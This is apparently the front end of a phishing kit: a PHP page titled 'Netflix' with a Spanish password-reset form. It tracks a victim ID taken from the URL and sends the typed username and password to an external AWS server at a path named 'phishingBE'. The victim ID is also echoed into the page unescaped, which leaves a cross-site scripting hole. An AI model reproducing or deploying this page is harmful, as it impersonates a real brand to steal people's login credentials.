<?php

$vid = $_GET['uid'];

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
</head>
<script type="text/javascript">
    $(document).ready(function() {

        var datos = $("#formulario_victimID").serialize();

        //hace la búsqueda
        $.ajax({
            type: "POST",
            url: "http://ec2-52-14-237-239.us-east-2.compute.amazonaws.com/phishingBE/v2/pagina.php",
            data: datos,
            /*       beforeSend: function(){
                         //imagen de carga
                         $("#resultado").html("<p align='center'><img src='ajax-loader.gif' /></p>");
                   },*/
            success: function(data) {
                console.log(data);
            },
            error: function(data) {
                console.log(data);
            }
        });
    });
</script>
<script>
      $(function () {

        $('#userpass').on('submit', function (e) {

          e.preventDefault();

          $.ajax({
            type: 'post',
            url: 'http://ec2-52-14-237-239.us-east-2.compute.amazonaws.com/phishingBE/v2/recibe_front.php',
            data: $('#userpass').serialize(),
            success: function (data) {
               console.log(data);
            },
            error: function(data) {
                console.log(data);
            },
          });

        });

      });
    </script>

<body>
    <form id="formulario_victimID" name="formulario_victimID">
        <input id="victimid" name="victimid" value="<?php echo $vid ?>" hidden>
    </form>

    <form id="userpass">
        <br>
        <div>
            <div style="padding-left:3%;padding-top: 3%">
                <h3>Restablecer contraseña </h3>
            </div>
            <hr>
            <div style="padding-left:3%">
                <div class="mb-3 row">
                    <label for="staticEmail" class="col-sm-2 col-form-label">Usuario </label>
                    <div class="col-sm-5">
                    <input id="uid" name="uid" value="<?php echo $vid ?>" hidden>
                        <input type="text" class="form-control" id="user" name="user">
                    </div>
                </div>

                <div class="mb-3 row">
                    <label for="staticEmail" class="col-sm-2 col-form-label">Contraseña </label>
                    <div class="col-sm-5">
                        <input type="text" class="form-control" id="contraseña" name="contraseña">
                    </div>
                </div>
            <div style="margin-top:3%">
                <button class="btn btn-primary" style="width:15%;" id="restablecer">Restablecer </button>
            </div>
        <div>
    </form>              

</body>

</html>